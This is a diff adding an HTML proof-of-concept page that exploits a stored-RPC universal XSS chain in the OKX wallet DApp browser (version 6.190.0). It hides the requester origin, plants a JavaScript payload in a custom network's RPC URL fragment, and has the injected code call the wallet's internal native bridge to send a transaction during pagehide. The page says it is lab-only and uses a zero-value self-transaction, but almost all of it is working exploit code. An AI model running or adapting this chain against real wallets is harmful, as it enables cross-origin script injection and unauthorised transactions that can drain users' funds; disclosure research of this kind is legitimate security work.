@@ -1,0 +1,206 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta property="og:site_name" content="">
+<title></title>
+<style>
+  body { max-width: 760px; margin: 2rem auto; padding: 0 1rem; font: 16px/1.5 system-ui; }
+  button { width: 100%; margin: .35rem 0; padding: .9rem; font: inherit; font-weight: 700; }
+  button:disabled { opacity: .55; }
+  pre { white-space: pre-wrap; word-break: break-word; background: #f4f4f4; padding: 1rem; }
+  .warning { border-left: 4px solid #b00020; padding-left: 1rem; }
+</style>
+
+<h1>OKX 6.190.0 hidden-origin → stored RPC UXSS chain</h1>
+<p class="warning">
+  Lab-only demonstration. Delete custom network <code>0x72</code> before each
+  run. Open this page top-level over HTTPS in the OKX DApp browser. The Add
+  Network requester title/origin is intentionally blank. Approve Connect, Add
+  Network, and Switch only. <strong>Reject the final TX dialog.</strong>
+</p>
+<p>
+  One click performs Connect, RPC probe, Add Network, Switch, and top-level
+  navigation to <code>https://httpbin.org/</code>. The stored RPC payload then
+  executes at that destination, waits until the native EVM bridge exists, arms
+  the confirmed <code>pagehide</code> path, and navigates once more. During that
+  page transition it requests one zero-value transaction back to the connected
+  address, with no calldata. Rejecting the native dialog prevents broadcast.
+</p>
+
+<button id="tx">RUN UXSS CHAIN → ZERO-VALUE SELF TX</button>
+<pre id="log"></pre>
+
+<script>
+const RPC_BASE = 'https://coston2-api.flare.network/ext/C/rpc';
+const CHAIN_ID = '0x72';
+const EXPLORER = 'https://coston2-explorer.flare.network/';
+const DESTINATION = 'https://example.com/';
+const PAGEHIDE_DESTINATION = 'https://example.com/';
+const TARGET_ORIGIN = new URL(DESTINATION).origin;
+
+const output = document.querySelector('#log');
+const log = (...parts) => {
+  output.textContent += `[${new Date().toISOString()}] ${parts.join(' ')}\n`;
+};
+
+function provider() {
+  return [window.okxwallet, window.okxwallet?.ethereum, window.ethereum]
+    .find(candidate => candidate && typeof candidate.request === 'function');
+}
+
+function timeout(promise, label, milliseconds = 180000) {
+  return Promise.race([
+    promise,
+    new Promise((_, reject) => setTimeout(
+      () => reject(new Error(`${label} did not settle in ${milliseconds / 1000}s`)),
+      milliseconds
+    ))
+  ]);
+}
+
+function payloadUrl(account) {
+  const bridgeMessage = {
+    id: Date.now(),
+    name: 'sendTransaction',
+    object: {
+      from: account,
+      to: account,
+      value: '0x0',
+      data: '0x',
+      gas: '0x5208'
+    }
+  };
+
+  const serializedBridgeMessage = JSON.stringify(JSON.stringify(bridgeMessage));
+  const serializedPagehideDestination = JSON.stringify(PAGEHIDE_DESTINATION);
+  const marker =
+    `top===self&&location.origin===${JSON.stringify(TARGET_ORIGIN)}` +
+    `&&!window.__okxHiddenOriginUxssAction` +
+    `&&(window.__okxHiddenOriginUxssAction=1,(()=>{` +
+      `const m=document.createElement('div');` +
+      `m.style='position:fixed;z-index:2147483647;inset:0;background:white;color:#b00020;padding:3rem;font:20px system-ui';` +
+      `m.textContent='OKX RPC UXSS EXECUTED @ '+location.origin+' — waiting for native bridge';` +
+      `document.documentElement.appendChild(m);` +
+      `let n=0;` +
+      `const arm=()=>{` +
+        `if(window.__okxTxArmed)return;` +
+        `const b=window.okxInternalJSBridge;` +
+        `if(b&&typeof b.postMessage==='function'){` +
+          `window.__okxTxArmed=1;` +
+          `const send=()=>{` +
+            `if(window.__okxTxSent)return;` +
+            `window.__okxTxSent=1;` +
+            `try{b.postMessage(${serializedBridgeMessage})}` +
+            `catch(e){window.__okxTxSent=0}` +
+          `};` +
+          `addEventListener('pagehide',send,{once:true,capture:true});` +
+          `addEventListener('unload',send,{once:true,capture:true});` +
+          `m.textContent='OKX RPC UXSS EXECUTED @ '+location.origin+' — pagehide TX armed; navigating now';` +
+          `setTimeout(()=>location.replace(${serializedPagehideDestination}),600);` +
+          `return` +
+        `}` +
+        `alert(document.domain);` +
+        `if(++n<80)setTimeout(arm,250);` +
+        `else m.textContent='UXSS executed, but okxInternalJSBridge was not found after 20 seconds'` +
+      `};` +
+      `setTimeout(arm,750)` +
+    `})())`;
+
+  // The fragment is not sent to the RPC server. The APK nevertheless retains
+  // the raw value and later concatenates it into a double-quoted JS literal.
+  return `${RPC_BASE}#hidden_origin="+(${marker},"")+"`;
+}
+
+async function run() {
+  if (location.protocol !== 'https:') throw new Error('Host this page over HTTPS');
+  if (top !== self) throw new Error('Open this page top-level, not in an iframe');
+
+  const wallet = provider();
+  if (!wallet) throw new Error('Injected OKX provider was not found');
+  log('True requester:', location.href);
+  log('Document title length:', document.title.length);
+  log('Selected final action: ZERO-VALUE SELF TX');
+  log('Safety: reject the final TX dialog.');
+
+  log('1/7 Connect: approve the native connection dialog.');
+  const accounts = await timeout(wallet.request({
+    method: 'eth_requestAccounts',
+    params: []
+  }), 'eth_requestAccounts');
+  if (!Array.isArray(accounts) || !accounts.length) {
+    throw new Error('Connection returned no EVM account');
+  }
+  const account = accounts[0];
+  log('PASS Connect; account count =', accounts.length, '(address not printed)');
+
+  const rpcUrl = payloadUrl(account);
+  log('2/7 Probe malicious-shaped RPC URL.');
+  const response = await timeout(fetch(rpcUrl, {
+    method: 'POST',
+    headers: { 'content-type': 'application/json' },
+    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_chainId', params: [] })
+  }), 'RPC probe', 30000);
+  const body = await response.json();
+  if (!response.ok || String(body.result).toLowerCase() !== CHAIN_ID) {
+    throw new Error(`RPC mismatch: HTTP ${response.status}, result ${body.result}`);
+  }
+  log('PASS Probe:', body.result);
+
+  log('3/7 Add Network: verify requester title/origin is absent, then approve.');
+  await timeout(wallet.request({
+    method: 'wallet_addEthereumChain',
+    params: [{
+      chainId: CHAIN_ID,
+      chainName: 'Hidden Origin UXSS Test',
+      nativeCurrency: { name: 'Coston2 Flare', symbol: 'C2FLR', decimals: 18 },
+      rpcUrls: [rpcUrl],
+      blockExplorerUrls: [EXPLORER]
+    }]
+  }), 'wallet_addEthereumChain');
+  log('PASS Add: raw RPC payload persisted.');
+
+  log('4/7 Switch: approve if prompted.');
+  await timeout(wallet.request({
+    method: 'wallet_switchEthereumChain',
+    params: [{ chainId: CHAIN_ID }]
+  }), 'wallet_switchEthereumChain');
+  const activeChain = await timeout(
+    wallet.request({ method: 'eth_chainId' }),
+    'eth_chainId',
+    30000
+  );
+  if (String(activeChain).toLowerCase() !== CHAIN_ID) {
+    throw new Error(`Switch mismatch: expected ${CHAIN_ID}, received ${activeChain}`);
+  }
+  log('PASS Switch:', activeChain);
+
+  log('5/7 Navigating to UXSS destination', DESTINATION);
+  log('6/7 UXSS waits for the bridge, then navigates to', PAGEHIDE_DESTINATION);
+  log('7/7 One TX is sent during pagehide; REJECT the native dialog.');
+  setTimeout(() => location.assign(DESTINATION), 700);
+}
+
+async function launch() {
+  document.querySelectorAll('button').forEach(button => { button.disabled = true; });
+  output.textContent = '';
+  try {
+    await run();
+  } catch (error) {
+    log('ERROR:', error?.stack || error?.message || String(error));
+    document.querySelectorAll('button').forEach(button => { button.disabled = false; });
+  }
+}
+
+document.querySelector('#tx').onclick = () => launch();
+
+// Parse-only check against the vulnerable native template.
+try {
+  const testAccount = '0x0000000000000000000000000000000000000001';
+  const generated = `window.okxwallet.setConfig({chainId:114,address:"",rpcUrl:"${payloadUrl(testAccount)}"})`;
+  new Function(generated);
+  document.documentElement.dataset.sinkTemplateSyntax = 'pass';
+} catch (error) {
+  document.documentElement.dataset.sinkTemplateSyntax = 'fail';
+  log('LOCAL TEMPLATE CHECK ERROR:', error?.message || String(error));
+}
+</script>
